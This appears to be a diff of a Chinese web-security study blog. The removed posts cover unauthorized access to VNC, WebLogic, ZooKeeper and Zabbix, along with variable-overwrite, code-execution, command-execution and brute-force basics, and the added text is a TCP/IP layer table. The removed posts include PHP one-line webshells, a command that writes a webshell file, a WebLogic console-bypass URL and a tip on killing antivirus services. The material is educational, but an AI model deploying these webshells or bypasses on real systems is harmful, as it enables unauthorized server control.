-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/KevinGeorge/p/10399844.html">https://www.cnblogs.com/KevinGeorge/p/10399844.html</a></p>
+<p>TCP&#x2F;IP四层模型、作用以及对应的网络协议</p>
 </blockquote>
-<h2 id="0x26-VNC-未授权访问"><a href="#0x26-VNC-未授权访问" class="headerlink" title="0x26 VNC 未授权访问"></a>0x26 VNC 未授权访问</h2><h3 id="1-漏洞简介-24"><a href="#1-漏洞简介-24" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。</p>
-<p>VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。</p>
-<h3 id="2-漏洞检测-24"><a href="#2-漏洞检测-24" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用 metasploit 进行批量检测，使用检测模块</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/vnc/vnx_none_auth</span><br></pre></td></tr></table></figure>
-
-<p>在kali上直接使用vncviewer命令连接主机。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncviewer ip</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-漏洞修复-24"><a href="#3-漏洞修复-24" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码；</li>
-<li>以最小权限的普通用户身份运行操作系统；</li>
-</ul>
-<h2 id="0x27-Weblogic-未授权访问"><a href="#0x27-Weblogic-未授权访问" class="headerlink" title="0x27 Weblogic 未授权访问"></a>0x27 Weblogic 未授权访问</h2><h3 id="1-漏洞简介-25"><a href="#1-漏洞简介-25" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p>
-<h3 id="2-漏洞检测-25"><a href="#2-漏洞检测-25" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-2020-14882</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201202222106.png" alt="img"></p>
-<p>攻击者可以构造特殊请求的URL，即可未授权访问到管理后台页面：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201202222023.png" alt="img"></p>
-<p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。</p>
-<h3 id="3-漏洞修复-25"><a href="#3-漏洞修复-25" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>下载补丁程序并安装更新；</li>
-</ul>
-<h2 id="0x28-ZooKeeper-未授权访问"><a href="#0x28-ZooKeeper-未授权访问" class="headerlink" title="0x28 ZooKeeper 未授权访问"></a>0x28 ZooKeeper 未授权访问</h2><h3 id="1-漏洞简介-26"><a href="#1-漏洞简介-26" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p>
-<h3 id="2-漏洞检测-26"><a href="#2-漏洞检测-26" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>stat：列出关于性能和连接的客户端的统计信息。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">stat</span> |ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure>
-
-<p>ruok：测试服务器是否运行在非错误状态。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ruok |ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure>
-
-<p>dump：列出未完成的会话和临时节点。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> dump |ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-漏洞修复-26"><a href="#3-漏洞修复-26" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>为ZooKeeper配置相应的访问权限；</li>
-<li>设置防火墙策略；</li>
-<li>禁止把Zookeeper直接暴露在公网；</li>
-</ul>
-<h2 id="0x29-Zabbix-未授权访问"><a href="#0x29-Zabbix-未授权访问" class="headerlink" title="0x29 Zabbix 未授权访问"></a>0x29 Zabbix 未授权访问</h2><h3 id="1-漏洞简介-27"><a href="#1-漏洞简介-27" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p>
-<h3 id="2-漏洞检测-27"><a href="#2-漏洞检测-27" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>无需账户密码直接访问zabbix页面</p>
-<p><img src="https://luckyseccloud.oss-cn-fuzhou.aliyuncs.com/picture/imgbed-master/posts/20201230111757.png" alt="img"></p>
-<h3 id="3-漏洞修复-27"><a href="#3-漏洞修复-27" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
-<li>设置zabbix的复杂口令，不要用默认口令或弱口令，禁用guest登录功能；</li>
-<li>zabbix的server和agent都不要以root启动，不要设置AllowRoot&#x3D;1；</li>
-<li>禁止agent执行system.run，不要设置EnableRemoteCommands&#x3D;1；</li>
-</ul>
-<blockquote>
-<p>转载：<a target="_blank" rel="noopener" href="http://www.luckyzmj.cn/posts/15dff4d3.html">http://www.luckyzmj.cn/posts/15dff4d3.html</a></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/17/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/17/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">变量覆盖漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-12-17 09:40:36" itemprop="dateCreated datePublished" datetime="2022-12-17T09:40:36+08:00">2022-12-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:29:50" itemprop="dateModified" datetime="2023-03-07T21:29:50+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><hr>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>定义：将程序中原有的变量值进行替换，从而达到攻击目的</p>
-<p>用自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击</p>
-<h2 id="变量覆盖函数"><a href="#变量覆盖函数" class="headerlink" title="变量覆盖函数"></a>变量覆盖函数</h2><blockquote>
-<p>$$</p>
-</blockquote>
-<p>$$这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名</p>
-<blockquote>
-<p>extract()函数</p>
-</blockquote>
-<p>extract() 从数组中将变量导入到当前的符号表 ，将数组中的键作为变量名，值作为变量的值</p>
-<blockquote>
-<p>parse_str()函数</p>
-</blockquote>
-<p>parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p>
-<p>注意：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量</p>
-<blockquote>
-<p>import_request_variables()函数</p>
-</blockquote>
-<p>import_request_variables：将 GET／POST／Cookie 变量导入到全局作用域中</p>
-<p>import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量,用在register_globals被禁止的时候</p>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><ul>
-<li>大多数情况下由函数使用不当导致的</li>
-<li>$$使用不当</li>
-<li>extract()函数使用不当</li>
-<li>parse_str()函数使用不当</li>
-<li>import_request_variables()使用不当</li>
-<li>开启了全局变量注册等</li>
-</ul>
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>变量覆盖的漏洞危害主要还是要看代码具体的流程</p>
-<p>如果可覆盖掉的变量在后面会进行代码执行，那么他的危害就是代码执行</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/16/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/16/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">代码执行漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-12-16 16:29:56" itemprop="dateCreated datePublished" datetime="2022-12-16T16:29:56+08:00">2022-12-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:29:55" itemprop="dateModified" datetime="2023-03-07T21:29:55+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><hr>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用户输入的数据被当做后端代码进行执行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Copy</p>
-<p>一句话木马的本质就是一个代码执行漏洞</p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE(remote command&#x2F;code execute)远程命令或者代码执行。现在因为RCE这个词的滥用，RCE的范围比较广，只要渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件Getshell都可以属于RCE。</p>
-<h2 id="在PHP中常用的代码执行函数"><a href="#在PHP中常用的代码执行函数" class="headerlink" title="在PHP中常用的代码执行函数"></a>在PHP中常用的代码执行函数</h2><ul>
-<li>eval()：可将普通字符当作代码进行执行，可以执行多行</li>
-<li>assert()：可将普通字符串当作代码进行执行，单行执行</li>
-<li>preg_replace()：正则替换函数，</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/a/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="number">8</span>],<span class="string">&#x27;bc&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Copy</p>
-<p><img src="https://xbxaq.com/media/202210/2022-10-19_135759_7877170.2744957509361642.png" alt="null"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意点：</span><br><span class="line">这里会固定报错，告诉你不建议你使用/e修饰符。</span><br><span class="line">替换必须真实发生才会触发函数，不发生替换，不会触发。</span><br></pre></td></tr></table></figure>
-
+<table>
+<thead>
+<tr>
+<th>四层模型</th>
+<th>作用</th>
+<th>网络协议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>负责处理应用程序的逻辑</td>
+<td>HTTP、FTP、TFTP、SMTP、Telnet、DNS、SNMP、…</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td>提供不具体网络的高效、经济、透明的端到端数据传输服务</td>
+<td>TCP、UDP</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>将数据分成一定长度的分组，将分组穿过通信子网，从信源选择路径后传到信宿</td>
+<td>IP、ICMP、ARP、RARP</td>
+</tr>
+<tr>
+<td>数据链路层</td>
+<td>将数据分成一个个数据帧，以数据帧为单位传输；有应有答，遇错重发</td>
+<td>FDDI、IEEE820x</td>
+</tr>
+</tbody></table>
+<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>负责在两个相邻结点间的线路上，无差错地传送以帧为单位的数据，并进行流量控制，每一帧包括一定数量的数据和一些必要的控制信息</p>
+<p>与物理层相似，数据链路层要负责建立、维持和释放数据链路的连接。在传送数据时，如果接收点检测到所传数据中有差错，就要通知发方重发这一帧</p>
+<p>该层通常又被分为 介质访问控制(MAC)和逻辑链路控制(LLC)两个子层：</p>
 <ul>
-<li>create_function() ：匿名函数</li>
-<li>array_map()：回调函数，调用某个函数</li>
-<li>特殊组合：”{phpinfo()}”; &#x3D;&#x3D;&#x3D;&gt;代码执行 phpinfo(),PHP的字符串是可以使用复杂的表达式。<br>例如 ${中间可以写调用的函数</li>
+<li>MAC子层的主要任务是解决共享型网络中多用户对信道竞争的问题，完成网络介质的访问控制</li>
+<li>LLC子层的主要任务是建立和维护网络连接，执行差错校验、流量控制和链路控制</li>
 </ul>
-<p>注意：特殊组合在PHP版本5.5及其以上版本可以使用</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">命令执行漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-12-15 20:11:56" itemprop="dateCreated datePublished" datetime="2022-12-15T20:11:56+08:00">2022-12-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:30:01" itemprop="dateModified" datetime="2023-03-07T21:30:01+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><hr>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>命令执行：用户输入的数据被当做系统命令执行</p>
-<p><img src="https://xbxaq.com/media/202210/2022-10-19_114648_4495750.28568979153771235.png" alt="null"></p>
-<p><img src="https://xbxaq.com/media/202210/2022-10-19_114815_2197170.4945763597497762.png" alt="null"></p>
-<p>菜刀的终端操作也是利用了命令执行的函数<br>命令执行也可以写文件的方法获得Webshell<br><code>system(&#39;echo &quot;\&lt;?php eval($_REQUEST[1]);?\&gt;&quot; &gt; 666.php&#39;);</code></p>
-<p><img src="https://xbxaq.com/media/202210/2022-10-19_114834_2665740.22737047952219325.png" alt="null"></p>
-<h2 id="在PHP中常用的系统命令执行函数"><a href="#在PHP中常用的系统命令执行函数" class="headerlink" title="在PHP中常用的系统命令执行函数"></a>在PHP中常用的系统命令执行函数</h2><ul>
-<li>system()：php中system函数用于执行外部程序，并且显示输出执行结果</li>
-<li>exec()：PHP会去操纵计算机执行whoami的命令,且获取最后一行数据，需要人为打印输出</li>
-<li>shell_exec()：PHP会去操纵计算机执行whoami的命令,且获取所有数据，需要人为打印输出</li>
-<li>passthru()：只调用命令，把命令的运行结果原样地直接输出到标准输出设备</li>
-<li>特殊符号 <code> </code> ：中间的字符会当作命令进行执行，需要人为打印，例如：echo <code>whoami</code>;</li>
-</ul>
-<h2 id="CMD中常用操作"><a href="#CMD中常用操作" class="headerlink" title="CMD中常用操作"></a>CMD中常用操作</h2><ul>
-<li><p>多行执行 &amp;</p>
-</li>
-<li><p>netstat -ano 查看端口</p>
-</li>
-<li><p>tasklist 查看进程</p>
-</li>
-<li><p>kill 杀死进程</p>
-</li>
-<li><p>arp -a 显示arp高速缓存列表</p>
-</li>
-<li><p>shutdown 关机（关闭杀软服务，然后重启主机）【找到杀毒软件服务是什么，干掉，再重启主机】</p>
-</li>
-<li><p>systeminfo 查看系统状态</p>
-</li>
-<li><p>net user 查看用户</p>
-</li>
-<li><p>echo 写文件</p>
-<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>())<span class="meta">?&gt;</span></span><span class="language-xml">;&quot;   &gt;&gt;   1.php</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/13/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">暴力破解</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-12-13 11:02:12" itemprop="dateCreated datePublished" datetime="2022-12-13T11:02:12+08:00">2022-12-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:29:45" itemprop="dateModified" datetime="2023-03-07T21:29:45+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><hr>
-<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>暴力破解是用户使用自定义字典文件中的内容与验证程序交互，从而在枚举过程中得到正确数据</p>
-<p>暴力破解的基础：</p>
-<ul>
-<li>应用程序或服务器未进行交互次数限制</li>
-<li>具有覆盖内容全面的字典文件</li>
-</ul>
-<h2 id="暴力破解的方式"><a href="#暴力破解的方式" class="headerlink" title="暴力破解的方式"></a>暴力破解的方式</h2><p>根据破解的验证内容是否处于服务状态将分为两类:</p>
-<p>在线破解</p>
-<p>离线破解</p>
-<p>无论在线还是离线 是否可以破解成功都取决于字典文件内容的强大</p>
-<p>破解速度的瓶颈在于本地机器与服务器性能、带宽等因素</p>
-<h1 id="暴力破解测试流程"><a href="#暴力破解测试流程" class="headerlink" title="暴力破解测试流程"></a>暴力破解测试流程</h1><h2 id="1、确认登录接口的脆弱性"><a href="#1、确认登录接口的脆弱性" class="headerlink" title="1、确认登录接口的脆弱性"></a>1、确认登录接口的脆弱性</h2><p>确认目标是否存在暴力破解的漏洞（确认被暴力破解的“可能性”）</p>
-<p>比如：尝试登录–抓包–观察验证元素和response信息，判断是否存在被暴力破解的可能</p>
-<h2 id="2、对字典进行优化"><a href="#2、对字典进行优化" class="headerlink" title="2、对字典进行优化"></a>2、对字典进行优化</h2><p>根据实际的情况对字典进行优化，提高破解过程的效率</p>
-<p>技巧一：根据注册时的提示信息进行优化</p>
-<p>技巧二：如果爆破的是管理后台，admin&#x2F;administrator&#x2F;root的可能性更大</p>
-<h2 id="3、工具自动化操作"><a href="#3、工具自动化操作" class="headerlink" title="3、工具自动化操作"></a>3、工具自动化操作</h2><p>配置自动化工具（比如线程、超时时间、重试次数等），进行自动化操作</p>
-<h1 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h1><p>1、设计安全的验证码（安全的流程+复杂而可用的图形）</p>
-<p>2、对认证错误的提交进行计数并给出限制，比如：连续5次密码错误，锁定账户1小时</p>
-<p>3、必要的情况下，使用双因素认证</p>
-<h1 id="token防暴力破解"><a href="#token防暴力破解" class="headerlink" title="token防暴力破解"></a>token防暴力破解</h1><p>token防不了暴力破解，因为token值是放在前端的，使用攻击者只需要在每次进行重放攻击之前，获取token值，然后放在表单中</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87&%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87&%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">验证码绕过&密码找回漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-12-09 11:37:39" itemprop="dateCreated datePublished" datetime="2022-12-09T11:37:39+08:00">2022-12-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:30:18" itemprop="dateModified" datetime="2023-03-07T21:30:18+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
